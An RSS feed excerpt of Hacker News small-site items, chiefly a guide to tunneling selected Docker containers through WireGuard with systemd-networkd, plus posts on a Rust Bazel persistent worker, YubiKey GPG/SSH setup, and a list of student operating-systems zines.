<p>wg-quick is easy, but it routes <em>all</em> traffic through the VPN, which is what you want <em>most of the times</em>, but not in our use case. Watch out, the allowed IP range does not help as you might think: You can tell WireGuard that only traffic <em>to</em> specific IPs should be routed through the VPN, which makes sense for something like a VPN for employees: only traffic to the company‚Äôs network should go through the VPN. We however need to filter by <em>source</em>. wg-quick can‚Äôt do that.</p>

<p>After quite a lot of searching I finally found a great <a href="https://nbsoftsolutions.com/blog/routing-select-docker-containers-through-wireguard-vpn#solution-2">blog article</a> detailing a solution to our exact problem using the <code>wg</code> and <code>ip</code> tools directly (and one using WireGuard client inside another container). This article is mostly based on that one.</p>
<p>The gist of that that method is: You set up a WireGuard interface manually, the same way wg-quick does internally, but without any routing to it yet. Then you add a routing rule via <code>ip</code> that sends all traffic from a specific subnet to the VPN. Lastly, you configure the desired Docker container to use exactly that subnet using Docker Compose or <code>docker network</code>.</p>
<p>While it is a nice and elegant solution, I think it is kind of cumbersome to configure, so I tried to find a more comfortable way of setting this up.</p>
<h2 id="systemd-networkd">systemd-networkd</h2>
<p>While I agree with some of the criticism against systemd and its policies, systemd-networkd really is the best thing that ever happened to network configuration on Linux. Instead of fiddling around with awfully complex tools like <code>ip</code> or weird network managers, you can set up your network with short, few and well-documented plain-text config files. I love it. Turns out it also has everything we need for tunneling our Docker containers, and in a nice and easy way. This is the solution I went with and want to show you.</p>

<p>For the impatient. For detailed instructions see below.</p>
<p>To tunnel a container through a WireGuard VPN given a wg-quick config file from your VPN provider, add these files to <code>/etc/systemd/network/</code>:</p>
<p><strong><code>80-wg0.netdev</code>:</strong></p>
<div id="cb1"><pre><code><span id="cb1-1"><span>[NetDev]</span></span>
<span id="cb1-2"><span>Name </span><span>=</span><span> wg0</span></span>
<span id="cb1-3"><span>Kind </span><span>=</span><span> wireguard</span></span>
<span id="cb1-4"><span>Description </span><span>=</span><span> WireGuard VPN</span></span>
<span id="cb1-5"></span>
<span id="cb1-6"><span>[WireGuard]</span></span>
<span id="cb1-7"><span>PrivateKey </span><span>=</span><span> {Private key, same as in wg-quick config}</span></span>
<span id="cb1-8"></span>
<span id="cb1-9"><span>[WireGuardPeer]</span></span>
<span id="cb1-10"><span>PublicKey </span><span>=</span><span> {Public key, same as in wg-quick config}</span></span>
<span id="cb1-11"><span>AllowedIPs </span><span>=</span><span> </span><span>0</span><span>.</span><span>0</span><span>.</span><span>0.0</span><span>/</span><span>0</span><span>,::</span><span>0</span><span>/</span><span>0</span></span>
<span id="cb1-12"><span>Endpoint</span><span>=</span><span> {Endpoint, same as in wg-quick config}</span></span></code></pre></div>
<p><strong><code>85-wg0.network</code>:</strong></p>
<div id="cb2"><pre><code><span id="cb2-1"><span>[Match]</span></span>
<span id="cb2-2"><span>Name</span><span>=</span><span>wg0</span></span>
<span id="cb2-3"></span>
<span id="cb2-4"><span>[Network]</span></span>
<span id="cb2-5"><span># If you need multiple addresses, e.g. for IPv4 and 6, use multiple Address lines.</span></span>
<span id="cb2-6"><span>Address </span><span>=</span><span> {Address to bind to inside the VPN, same as in wg-quick config}</span></span>
<span id="cb2-7"></span>
<span id="cb2-8"><span>[RoutingPolicyRule]</span></span>
<span id="cb2-9"><span>From </span><span>=</span><span> </span><span>10</span><span>.</span><span>123</span><span>.</span><span>0.0</span><span>/</span><span>16</span></span>
<span id="cb2-10"><span>Table </span><span>=</span><span> </span><span>242</span></span>
<span id="cb2-11"></span>
<span id="cb2-12"><span>[Route]</span></span>
<span id="cb2-13"><span>Gateway </span><span>=</span><span> {The address of the interface, same as above in [Network] in Address}</span></span>
<span id="cb2-14"><span>Table </span><span>=</span><span> </span><span>242</span></span>
<span id="cb2-15"></span>
<span id="cb2-16"><span>[Route]</span></span>
<span id="cb2-17"><span>Destination </span><span>=</span><span> </span><span>0</span><span>.</span><span>0</span><span>.</span><span>0.0</span><span>/</span><span>0</span></span>
<span id="cb2-18"><span>Type </span><span>=</span><span> blackhole</span></span>
<span id="cb2-19"><span>Metric </span><span>=</span><span> </span><span>1</span></span>
<span id="cb2-20"><span>Table </span><span>=</span><span> </span><span>242</span></span></code></pre></div>
<p>Then run <code>sudo docker network create tunneled0 --subnet 10.123.0.0</code>. Now you can run docker containers with <code>--net=tunneled0</code> to tunnel them.</p>
<p>Alternatively use Docker Compose to create and use a Docker network in that subnet:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>version</span><span>:</span><span> </span><span>"3.7"</span></span>
<span id="cb3-2"><span>services</span><span>:</span></span>
<span id="cb3-3"><span>  </span><span>app</span><span>:</span></span>
<span id="cb3-4"><span>    </span><span>image</span><span>:</span><span> </span><span>{</span><span>image</span><span>}</span></span>
<span id="cb3-5"><span>    </span><span>dns</span><span>:</span><span> </span><span>"{DNS server to use}"</span></span>
<span id="cb3-6"><span>    </span><span>networks</span><span>:</span></span>
<span id="cb3-7"><span>      </span><span>tunneled0</span><span>:</span><span> </span><span>{}</span></span>
<span id="cb3-8"><span>networks</span><span>:</span></span>
<span id="cb3-9"><span>  </span><span>tunneled0</span><span>:</span></span>
<span id="cb3-10"><span>    </span><span>ipam</span><span>:</span></span>
<span id="cb3-11"><span>      </span><span>config</span><span>:</span></span>
<span id="cb3-12"><span>        </span><span>-</span><span> </span><span>subnet</span><span>:</span><span> 10.123.0.0/16</span></span></code></pre></div>
<p>That‚Äôs it!</p>

<h2 id="preparation">Preparation</h2>
<p>Make sure that your host has:</p>
<ul>
<li>systemd. Most Linuxes do.</li>
<li>The WireGuard kernel module installed or kernel 5.6 or newer running.</li>
<li>The WireGuard tools installed.</li>
<li>Docker and optionally Docker Compose installed.</li>
<li>A working network connection. I don‚Äôt think it needs to be configured using systemd-networkd, though I haven‚Äôt tested that. I recommend to use networkd if possible anyway.</li>
<li>systemd-networkd running and enabled (<code>sudo systemctl enable systemd-networkd &amp;&amp; systemctl start system-networkd</code>).</li>
</ul>
<h2 id="setting-up-the-interface">Setting up the Interface</h2>
<p>First we have to get the WireGuard interface running. We couldn‚Äôt do it with <code>wg-quick</code> as it automatically routes all traffic through it, and using <code>wg</code> is cumbersome, so we use systemd-networkd. All we have to do is add two files in <code>/etc/systemd/network/</code>:</p>
<p><strong><code>80-wg0.netdev</code>:</strong></p>
<div id="cb4"><pre><code><span id="cb4-1"><span>[NetDev]</span></span>
<span id="cb4-2"><span># Or any other name</span></span>
<span id="cb4-3"><span>Name </span><span>=</span><span> wg0</span></span>
<span id="cb4-4"><span>Kind </span><span>=</span><span> wireguard</span></span>
<span id="cb4-5"><span># Or your own description</span></span>
<span id="cb4-6"><span>Description </span><span>=</span><span> WireGuard VPN</span></span>
<span id="cb4-7"></span>
<span id="cb4-8"><span>[WireGuard]</span></span>
<span id="cb4-9"><span>PrivateKey </span><span>=</span><span> {Private key, same as in wg-quick config}</span></span>
<span id="cb4-10"></span>
<span id="cb4-11"><span>[WireGuardPeer]</span></span>
<span id="cb4-12"><span>PublicKey </span><span>=</span><span> {Public key, same as in wg-quick config}</span></span>
<span id="cb4-13"><span># Remeber, these are allowed target IPs, not source, therefore we allow all</span></span>
<span id="cb4-14"><span>AllowedIPs </span><span>=</span><span> </span><span>0</span><span>.</span><span>0</span><span>.</span><span>0.0</span><span>/</span><span>0</span><span>,::</span><span>0</span><span>/</span><span>0</span></span>
<span id="cb4-15"><span>Endpoint</span><span>=</span><span> {Endpoint, same as in wg-quick config}</span></span></code></pre></div>
<p><strong><code>85-wg0.network</code>:</strong></p>
<div id="cb5"><pre><code><span id="cb5-1"><span>[Match]</span></span>
<span id="cb5-2"><span># Same as in .netdev file</span></span>
<span id="cb5-3"><span>Name</span><span>=</span><span>wg0</span></span>
<span id="cb5-4"></span>
<span id="cb5-5"><span>[Network]</span></span>
<span id="cb5-6"><span># If you need multiple addresses, e.g. for IPv4 and 6, use multiple Address lines.</span></span>
<span id="cb5-7"><span>Address </span><span>=</span><span> {Address to bind to inside the VPN, same as in wg-quick config}</span></span></code></pre></div>
<p>As you can see, it‚Äôs very similar to and just as easy as a wg-quick config file and most values can be taken straight from said file. For more info take a look at the man pages of <a href="https://www.freedesktop.org/software/systemd/man/systemd.netdev.html">netdev</a> and <a href="https://www.freedesktop.org/software/systemd/man/systemd.network.html">network</a> files.</p>
<p>The names of the files can be adjusted to your liking. Note that systemd-networkd reads config files in alphabetic order, so adjust the prefixed numbers in the names if necessary.</p>
<p>Use <code># systemctl restart systemd-networkd</code> (or reboot to be sure) to apply the configs. Now you can verify that the inferface is actually working:</p>
<pre><code>$ curl -4 icanhazip.com
$ sudo curl -4 --interface wg0 icanhazip.com</code></pre>
<p>The results of the two <code>curl</code> calls should be different, the first shows your normal IP, the second one should yield the VPN IP address. Note that for me the second curl only works as root (probably curl can only bind to the interface as root for some reason). With <code>sudo wg</code> and <code>networkctl status wg0</code> you can get further info about the interface.</p>
<h2 id="routing">Routing</h2>
<p>Now that we got the WireGuard interface up and running we have to arrange for the traffic of our Docker container to actually go through it. Turns out all we have to do is adding four lines to <code>85-wg0.network</code>. This it how it should look like:</p>
<p><strong>Updated <code>85-wg0.network</code>:</strong></p>
<div id="cb7"><pre><code><span id="cb7-1"><span>[Match]</span></span>
<span id="cb7-2"><span>Name</span><span>=</span><span>wg0</span></span>
<span id="cb7-3"></span>
<span id="cb7-4"><span>[Network]</span></span>
<span id="cb7-5"><span># If you need multiple addresses, e.g. for IPv4 and 6, use multiple Address lines.</span></span>
<span id="cb7-6"><span>Address </span><span>=</span><span> {Address to bind to inside the VPN, same as in wg-quick config}</span></span>
<span id="cb7-7"></span>
<span id="cb7-8"><span>[RoutingPolicyRule]</span></span>
<span id="cb7-9"><span># Or any other unused private subnet</span></span>
<span id="cb7-10"><span>From </span><span>=</span><span> </span><span>10</span><span>.</span><span>123</span><span>.</span><span>0.0</span><span>/</span><span>16</span></span>
<span id="cb7-11"><span># Or any other unused table number</span></span>
<span id="cb7-12"><span>Table </span><span>=</span><span> </span><span>242</span></span>
<span id="cb7-13"></span>
<span id="cb7-14"><span>[Route]</span></span>
<span id="cb7-15"><span>Gateway </span><span>=</span><span> {The address of the interface, same as above}</span></span>
<span id="cb7-16"><span># Same table number as above</span></span>
<span id="cb7-17"><span>Table </span><span>=</span><span> </span><span>242</span></span>
<span id="cb7-18"></span>
<span id="cb7-19"><span>[Route]</span></span>
<span id="cb7-20"><span>Destination </span><span>=</span><span> </span><span>0</span><span>.</span><span>0</span><span>.</span><span>0.0</span><span>/</span><span>0</span></span>
<span id="cb7-21"><span>Type </span><span>=</span><span> blackhole</span></span>
<span id="cb7-22"><span>Metric </span><span>=</span><span> </span><span>1</span></span>
<span id="cb7-23"><span># Same table number as above</span></span>
<span id="cb7-24"><span>Table </span><span>=</span><span> </span><span>242</span></span></code></pre></div>
<p>What the <code>[RoutingPolicyRule]</code> section does is taking all traffic from the specified subnet and looking up the routes in routing table 242 for it. We add a route to (hopefully previously empty) table 242 with the <code>[Route]</code> section, and that route sends the traffic to our WireGuard interface because we set the interface‚Äôs address as gateway.</p>
<p>The second <code>[Route]</code> section sets a blackhole route in the same table with a metric of 1, that means a lower priority than the default metric of 0. This should discard all traffic (instead of routing it through the default network without any VPN) if the VPN gateway is down and therefore prevent leaks.</p>
<p>That should be all we have to do on the system side!</p>
<h2 id="using-it-with-docker">Using it with Docker</h2>
<p>To actually get Docker to use the interface with specific containers we have two possibilities.</p>
<p>Note for both methods that published ports will not be available on <code>localhost</code> on the host as they normally would as all container traffic goes through the VPN (which is what we wanted, of course). So if you add an exposed port it must be accessed through the VPN‚Äôs outside address.</p>
<h3 id="docker-directly">Docker Directly</h3>
<p>Create a Docker network in the subnet we used in the systemd-networkd config file with <code>sudo docker network create tunneled0 --subnet 10.123.0.0</code> (or use any other name than <code>tunneled0</code>), then run containers in that network by using the <code>--net=tunneled0</code> option. With the <code>--dns</code> option you can set a custom DNS so that no DNS traffic gets leaked.</p>
<p>For example, you can use <code>sudo docker run -t --net=tunneled0 curlimages/curl icanhazip.com</code> to check that the returned IP is actually the VPN‚Äôs IP.</p>
<h3 id="docker-compose">Docker Compose</h3>
<p>This is the more comfortable method. You can use this as a base for your own compose files:</p>
<div id="cb8"><pre><code><span id="cb8-1"><span>version</span><span>:</span><span> </span><span>"3.7"</span></span>
<span id="cb8-2"><span>services</span><span>:</span></span>
<span id="cb8-3"><span>  </span><span>app</span><span>:</span></span>
<span id="cb8-4"><span>    </span><span>image</span><span>:</span><span> </span><span>{</span><span>image</span><span>}</span></span>
<span id="cb8-5"><span>    </span><span>dns</span><span>:</span><span> </span><span>"{DNS server to use}"</span></span>
<span id="cb8-6"><span>    </span><span>networks</span><span>:</span></span>
<span id="cb8-7"><span>      # Or your own name</span></span>
<span id="cb8-8"><span>      </span><span>tunneled0</span><span>:</span></span>
<span id="cb8-9"><span>networks</span><span>:</span></span>
<span id="cb8-10"><span>  # Same name as above</span></span>
<span id="cb8-11"><span>  </span><span>tunneled0</span><span>:</span></span>
<span id="cb8-12"><span>    </span><span>ipam</span><span>:</span></span>
<span id="cb8-13"><span>      </span><span>config</span><span>:</span></span>
<span id="cb8-14"><span>        </span><span>-</span><span> </span><span>subnet</span><span>:</span><span> 10.123.0.0/16</span></span></code></pre></div>
<h2 id="port-forwarding">Port Forwarding</h2>
<p>You can use Docker‚Äôs normal port publishing options to make ports available through the VPN. So, for example, if your VPN provider gives you port <code>1234</code> and you want port <code>80</code> inside your container to be available through the VPN, call Docker with <code>-p 1234:80</code> (do not forget ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.eisfunke.com/article/docker-wireguard-systemd.html">https://www.eisfunke.com/article/docker-wireguard-systemd.html</a></em></p>]]>
            </description>
            <link>https://www.eisfunke.com/article/docker-wireguard-systemd.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24583512</guid>
            <pubDate>Thu, 24 Sep 2020 20:54:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Bazel Persistent Worker for Rust]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24583439">thread link</a>) | @lukastyrychtr
<br/>
September 24, 2020 | https://nikhilism.com/post/2020/bazel-persistent-worker-rust/ | <a href="https://web.archive.org/web/*/https://nikhilism.com/post/2020/bazel-persistent-worker-rust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
			

<p><a href="https://docs.bazel.build/versions/master/persistent-workers.html">Bazel persistent
workers</a> are
a cool feature that allow Bazel to start up ‚Äúcompiler‚Äù instances that can
accept multiple build requests. This brings benefits like saving startup time,
<a href="https://www.youtube.com/watch?v=0pgERydGyqo">saving the time to parse a standard
library</a> or share some cache
across compiler invocations. This allows slight speedups in rebuilds, which can
be valuable in speeding up the developer iteration cycle.</p>

<p>This is best exemplified in the existing persistent workers:</p>

<ol>
<li>The Java and Scala rules benefit from paying the cost of process startup only once (warming up the JVM and so on.)</li>
<li>The TypeScript compiler benefits from parsing all the JS standard library type definitions only once instead of on each re-compile.</li>
</ol>

<p>I have <a href="https://github.com/nikhilm/rustc-worker">just released</a> a similar
compiler wrapper for <a href="https://rust-lang.org/">Rust</a>. The unimaginatively named
<a href="https://github.com/nikhilm/rustc-worker"><code>rustc-worker</code></a> does not get any of
the above benefits, since <code>rustc</code> does not have a <a href="https://www.infoq.com/news/2020/01/rust-analyser-ide-support/">‚Äúservice‚Äù
mode</a> yet.
Instead it brings the speed up due to incremental compilation that is already
the default in Cargo builds to Bazel.</p>

<p>Since <a href="https://blog.rust-lang.org/2018/02/15/Rust-1.24.html">Rust 1.24</a>, rustc
has a notion of <a href="https://blog.rust-lang.org/2016/09/08/incremental.html">incremental
compilation</a>. When <code>-C
incremental=/a/directory</code> is passed to it (as Cargo does<sup id="fnref:1"><a href="#fn:1">1</a></sup>), intermediate state
is saved in that directory.  This allows it to rebuild the crate faster.</p>

<p>By default Bazel uses sandboxing to guarantee more hermetic builds. This means
that the <code>rustc</code> invoked does not have access to data written by prior
invocations of itself, so it cannot take advantage of incremental compilation.
This means Bazel rebuilds of Rust code are slower than their Cargo equivalents.</p>

<p>Introducing a persistent worker allows enabling incremental mode because the
worker process can introduce a cache that is shared across builds. The worker
is responsible for making sure this cache does not violate hermeticity
completely. Of course, we rely on rustc‚Äôs notion of incrementality being sound.</p>

<p>Rebuilds of <a href="https://github.com/nikhilm/ninja-rs">ninjars</a> are roughly <strong>2x faster</strong> with workers. This is not a benchmark by any means, but clearly there is an improvement.</p>

<pre><code>cargo build (incremental by default)  1.65s
bazel build (without worker)          2.47s
bazel build (with worker)             1.2s
</code></pre>

<h2 id="how-do-i-try-this-out">How do I try this out?</h2>

<p>The <a href="https://github.com/nikhilm/rustc-worker/blob/master/README.md">README</a> has instructions. There is an <a href="https://github.com/bazelbuild/rules_rust/issues/412">open issue</a> on <a href="https://github.com/bazelbuild/rules_rust">rules_rust</a> to consider integrating this in the default rules. Please upvote/participate in that issue if this is something you find useful.</p>

<p>Give it a shot and <a href="https://github.com/nikhilm/rustc-worker/issues">file issues</a> if something goes wrong.</p>

<h2 id="implementation">Implementation</h2>

<p>Writing a persistent worker is fairly easy. One has to watch for the special
argument <code>--persistent_worker</code> and then read protocol buffers on stdin. Using
<a href="https://developers.google.com/protocol-buffers">Protocol Buffers</a> in Rust is
really easy using <a href="https://github.com/danburkert/prost">Prost</a>. The only
annoying part is reading length-delimited messages from stdin. Since Prost
reads from a byte buffer, and not a stream, we need to do some <a href="https://github.com/nikhilm/rustc-worker/blob/5fc019da61bd9d707fe15d1bf0b900fc6416a829/src/lib.rs#L62">careful
reads</a>.</p>

<p>There are a few more things I need to fix, like using the path to rustc and the
Bazel compilation mode in the cache path. I‚Äôm really hoping this will
integrated into rules_rust so everyone benefits.</p>


		</section></div>]]>
            </description>
            <link>https://nikhilism.com/post/2020/bazel-persistent-worker-rust/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24583439</guid>
            <pubDate>Thu, 24 Sep 2020 20:49:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Yubikey Setup Guide for Software Developers]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24583224">thread link</a>) | @zackify
<br/>
September 24, 2020 | https://zach.codes/ultimate-yubikey-setup-guide/ | <a href="https://web.archive.org/web/*/https://zach.codes/ultimate-yubikey-setup-guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <ul><li><a href="#intro">Intro</a></li><li><a href="#getting-started">Getting Started</a></li><li><a href="#generating-the-master-key">Generating the Master Key</a></li><li><a href="#exporting-the-key">Exporting the Key</a></li><li><a href="#setting-up-your-yubikey">Setting up your Yubikey</a></li><li><a href="#adding-to-a-yubikey">Adding to a Yubikey</a></li><li><a href="#setting-up-gpg-signing">Setting up GPG Signing</a></li><li><a href="#using-ssh">Using SSH</a></li><li><a href="#using-duplicated-keys">Using Duplicated Keys</a></li></ul><h2 id="intro">Intro</h2><p>In the past year Yubico has updated their firmware to support Ed25519. This finally brings support for elliptical curve encryption, and much shorter ssh public keys.</p><p>Yubikeys are really useful, they allow you to do git commit signing, ssh, and store your private key on an external device.</p><p>This lets you jump between computers easily, and you never have your private key sitting on a local filesystem. </p><p>One critical piece to this setup is making backup keys, this has been covered by other blog posts, but there's a less common issue out there: plugging in a cloned key will cause a GPG error that you have to work around on your own... This is frustrating if you setup two yubikeys, and frequently use them both. </p><p>This guide will cover creating the GPG master key. Setting it up for commit signing, using this master key with ssh, how to make backups, and how to setup multiple computers. Unfortunately it's a bit involved for newcomers, but once you have this system setup, you're left with an extremely secure SSH + GPG solution!</p><h2 id="getting-started">Getting Started</h2><p>You need to purchase a <a href="https://www.yubico.com/store/">Yubikey</a> that was made after November 2019. That's around the time that 5.2.3 came out. You can read more about it <a href="https://support.yubico.com/support/solutions/articles/15000027139-yubikey-5-2-3-enhancements-to-openpgp-3-4-support">here</a>. This firmware version added support for curve25519. I have used the 5CI, 5C nano, 5C, 5 NFC, and the brand new 5C NFC. I've duplicated my master key across each of my keys. I highly recommend you buy at least two keys, so that if you lose one you are not locked out of servers or other systems.</p><p>Let's get started by installing the gpg tooling. Be sure to do this step on every computer that you plan to use your Yubikey with!</p><pre><code>brew install gnupg pinentry-mac</code></pre><p>If you're not running a mac, be sure to download the gnupg utility for your OS.</p><h2 id="generating-the-master-key">Generating the Master Key</h2><p>This will be the master GPG key for all of our Yubikeys, our ssh key is also derived from it. Open up a terminal, and create a new directory. I will use a folder called <code>gpg</code> and will reference it later. Then run the following:</p><pre><code>gpg --expert --full-gen-key</code></pre><p>Now that we are inside the gpg tool, select <code>9</code> for ECC. Followed by <code>1</code> for curve25519. </p><p>I tend to chose <code>0</code> on the next step, so that my key never expires. It will then ask for your name and email address, then you can hit "O" for okay. </p><p>The final step is a prompt to choose a password. Be sure to choose something long and very random. I wrote my secret key down on paper for safe keeping. You will need to retype this secret key a lot unfortunately. 3 times per yubikey in order to copy it over, so don't forget it!</p><h4 id="adding-subkeys">Adding subkeys</h4><p>You should now see a line outputted after its creation that looks like this:</p><pre><code>gpg: key A5CA05BB6F4730D4 marked as ultimately trusted</code></pre><p>To make our next steps easier to follow, please run this in your terminal:</p><pre><code>echo "A5CA05BB6F4730D4" &gt;&gt; keyid</code></pre><p>Replace the key id above with your own. We are just throwing it into a file in the current folder for safe keeping.</p><p>We need to create <code>authentication</code> and <code>signature</code> subkeys before our master key is complete.</p><pre><code>gpg --expert --edit-key $(cat keyid)</code></pre><p>Now we are inside the gpg tool and need to do the following:</p><pre><code>addkey
choose "11" ECC (set your own capabilities)
choose "A" Toggle the authenticate capability
type "Q"
choose "1" Curve 25519</code></pre><p>After that, you can set the expiration, and then type in your secret key to finish creating the sub key. We need to do it once more for the signing key:</p><pre><code>addkey
choose "10" ECC (sign only)
choose "1" Curve 25519</code></pre><p>Set expiration, and choose yes to create, and then yes again to really create it..... these gpg tools are not very user friendly are they?</p><p>Okay! We did it... we created the keys and just need to type <code>save</code> to get out of the gpg tool. We can finally move on.</p><h2 id="exporting-the-key">Exporting the Key</h2><p>Inside your <code>gpg</code> folder, run the following:</p><pre><code>gpg --armor --export-secret-keys $(cat keyid) &gt; mastersub.key
gpg --armor --export-secret-subkeys $(cat keyid) &gt; sub.key
gpg --armor --export $(cat keyid) &gt; public.key</code></pre><p>We've successfully exported our key, and the corresponding gpg public key. This will be needed later when we setup commit signing. </p><p>THIS IS VERY IMPORTANT</p><p>be sure to make a zip file of your gpg folder that we ran the commands inside of. You should have the following files inside:</p><pre><code>keyid        
mastersub.key 
public.key    
sub.key</code></pre><p>This zip file (gpg.zip) should be backed up offline to a usb drive, or other secure location. It is also very important, because each time we move our gpg key over to a yubikey, the gpg tool destroys the key. So we have to copy over a duplicate each time. </p><p>Side note... this is yet another annoyance with the gpg tool. I am trying to make this guide as straight forward as I can, it took me forever to do all of this because of how overly complicated the gpg tools are. Thankfully some core contributors are <a href="https://sequoia-pgp.org/">rewriting the spec in rust</a>.</p><h2 id="setting-up-your-yubikey">Setting up your Yubikey</h2><p>We'll move on to getting our yubikey ready! We start by configuring it. GPG recognizes Yubikeys as smart cards:</p><pre><code>gpg --card-edit
admin
passwd</code></pre><p>On this prompt, you will want to choose <code>1</code> to change the pin. When the prompt comes up, type <code>123456</code> for the current pin, this is the default for yubikeys. After, set a secure password. This will be used to unlock the secret key on your Yubikey for ssh or gpg usage. I like to keep mine kind of short, but also something that isn't too easy.</p><p>After that, type <code>3</code>. This time we need to change the admin pin. The initial pin is <code>12345678</code>. I tend to use the same pin for admin and normal pins. I also use the same pin on each of my backup yubikeys, so that I don't accidentally get locked out. After that's done, type <code>q</code>, then there's a few extra commands you can set if you want to:</p><pre><code>name
lang
login</code></pre><p>Before we add the keys to our Yubikey, there are a couple optional setup steps. If you want to, you can go download <a href="https://developers.yubico.com/yubikey-manager/">Yubikey Manager CLI</a>. And run these commands:</p><pre><code>ykman openpgp set-touch aut off
ykman openpgp set-touch sig on
ykman openpgp set-touch enc on</code></pre><p>It's up to you to set these to on or off. This is just telling your yubikey that any authentication, signature, or encryption key usage, requires a physical touch of the device before it will do the operation. This can be useful for ultra security conscious individuals. A program wouldn't be able to sign or encrypt anything with your key in the background, because it would require a touch before any action.</p><p>The last thing I tend to do, is install up the <a href="https://developers.yubico.com/yubikey-manager-qt/">Yubikey Manager GUI</a>, go to Applications -&gt; OTP, and disabled the short touch action. This is on by default and if you bump it during a slack message, it can be really weird sending these authenticator codes by accident. </p><p>I like to configure the long touch action with a static password, I will choose something really random, but use it across all of my backup keys. If I am on a public computer without access to 1Password, I can use it as a secure password option, or you could even store your 1Password secret key here.</p><p>Oh, and before I forget, you can also go to Applications -&gt; FIDO2 and set a pin there. This will be used for <a href="https://webauthn.io/">Webauthn</a> when supported. If you use your Yubikey for 2FA on the web, it will require a pin, this protects you from someone stealing your yubikey and attempting to use it to access a service online, they would also need your pin. Also note that this is separate, and not the same as the GPG smart card pin we created earlier. All these specs in one device.... confusing huh?</p><p>There's so much these keys can do, and its spread across wayyyy too many applications and configurations!</p><h2 id="adding-to-a-yubikey">Adding to a Yubikey</h2><p>This section can be followed again for every Yubikey that you want to use. These will be exact clones with the master key on them, and will expose the same ssh public key every time you do this process.</p><p>You need to run the following commands outside of the <code>gpg</code> directory that we created in the key creation step. </p><p>Your current directory should have <code>gpg.zip</code> in it. Start by unarchiving the <code>gpg.zip</code> that we created earlier. Each time you do this section (for every key) you need to delete the <code>gpg</code> folder, and unarchive <code>gpg.zip</code> again. We can't reuse the <code>gpg</code> folder each time, because the gpg smart card commands delete the secret key, so you MUST have a fresh copy of the gpg files each time.</p><pre><code># unzip gpg.zip
export GNUPGHOME=$(mktemp -d)
cp -r gpg $GNUPGHOME
cd $GNUPGHOME/gpg

gpg --import mastersub.key
gpg --edit-key $(cat keyid)
</code></pre><p>Now we begin copying each of the three keys off the card. It's a bit verbose, so here's how you do it:</p><pre><code>key 1
keytocard (choose encryption, 1)
key 1


key 2
keytocard (signature)
key 2


key 3
keytocard (auth)
key 3
save</code></pre><p>GPG makes you select the key, then after doing <code>keytocard</code> you have to deselect it by typing the same thing again. It sometimes says "operation not supported by device" after you do the initial yubikey setup and run the <code>keytocard</code> command. Just unplug your yubikey, then plug it back in, type <code>keytocard</code> again, and it should show the key selection menu.</p><p>Each time you do <code>keytocard</code> you will have to enter the master key's secret key that you wrote down earlier, followed by the card's admin pin that you set. Like I said, pretty verbose, and can take a while if you have a really long secret key!</p><p>After this step is complete, your yubikey is ready to go.</p><h2 id="setting-up-gpg-signing">Setting up GPG Signing</h2><p>This process should be done on each computer that you want to do commit signing on.</p><pre><code>git config --global user.signingkey $(cat keyid)
git config --global commit.gpgsign true
gpg --import public.key</code></pre><p>The last command is the most important part. You must import the public key from your gpg master key, otherwise git won't recognize your yubikey. Don't ask how many hours I spent being confused as to why this didn't work on my second computer the first time :P &nbsp;</p><p>Be sure to add the contents of our <code>public.key</code> file to GitHub or other service, so that your commits will show as verified. </p><h2 id="using-ssh">Using SSH</h2><p>On a Mac you need to do the following:</p><pre><code>vi ~/.gnupg/gpg-agent.conf</code></pre><p>the contents are:</p><pre><code>use-st‚Ä¶</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://zach.codes/ultimate-yubikey-setup-guide/">https://zach.codes/ultimate-yubikey-setup-guide/</a></em></p>]]>
            </description>
            <link>https://zach.codes/ultimate-yubikey-setup-guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24583224</guid>
            <pubDate>Thu, 24 Sep 2020 20:29:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Operating systems zines made by CS students]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582973">thread link</a>) | @azhenley
<br/>
September 24, 2020 | https://nipunbatra.github.io/os2020/zine/ | <a href="https://web.archive.org/web/*/https://nipunbatra.github.io/os2020/zine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/booting.png" alt="">
    </p>
    <div>
      <h3><b>Booting</b></h3>
      <p>Arpit Patel &amp; Lovepreet Singh</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/booting.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1ecfxb93eQiO1A13lTeZ8tm6VHBX3zaaJ/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/CFS.png" alt="">
    </p>
    <div>
      <h3><b>Completely Fair Scheduler</b></h3>
      <p>Preet Patel &amp;  Ribhu Vajpeyi</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/CFS.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1bNf4Bloj71m9fKkZoN5Ot1flXyvGUKgB/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Checksum.png" alt="">
    </p>
    <div>
      <h3><b>Checksum</b></h3>
      <p>Anupam Kumar &amp; Chiluveru Preeti</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Checksum.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/181N0FAGVofW3dBhQ6tQsuUcim0YpdtlW/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/chmod.png" alt="">
    </p>
    <div>
      <h3><b>chmod</b></h3>
      <p>Pranshu Kumar Gond &amp; Sagar Bisen</p>
 
